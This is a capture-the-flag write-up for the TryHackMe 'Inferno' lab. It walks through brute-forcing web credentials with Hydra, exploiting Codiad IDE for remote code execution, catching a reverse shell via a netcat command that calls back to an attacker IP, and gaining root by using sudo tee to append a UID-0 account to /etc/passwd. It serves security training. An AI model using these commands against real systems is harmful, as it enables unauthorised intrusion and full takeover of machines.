Inferno - TryHackMe Writeup
ip=10.48.172.147
1. Enumeration
Start with an Nmap scan to identify open ports:

Port 80: HTTP (Apache)

Port 22: SSH

Directory brute-forcing reveals a /inferno directory which requires HTTP Basic Authentication. Use Hydra with a common wordlist to crack the credentials for the web login.

2. Initial Access (The "Double NC" Trick)
Inside the web panel, we find Codiad IDE. This version is vulnerable to Remote Code Execution (RCE).

To stabilize the shell and prevent it from dying instantly, use two Netcat listeners:

Terminal 1 (The Trap):
echo 'bash -i >& /dev/tcp/YOUR_IP/9002 0>&1' | nc -lvnp 9001

Terminal 2 (The Real Shell):
nc -lvnp 9002

Run the Python exploit pointing to port 9001. The exploit hits 9001, which immediately triggers a permanent shell on 9002.

3. Horizontal Privilege Escalation
Once inside as www-data, look for hidden files. There is a file containing hex-encoded strings. Decode the hex to find the password for the user dante. Switch user:
su dante

4. Vertical Privilege Escalation (Root)
Check sudo permissions:
sudo -l

The user can run /usr/bin/tee as root without a password. Use this to append a new root user to /etc/passwd:
echo "newroot:[PASSWORD_HASH]:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd

Switch to your new user to grab the root flag.
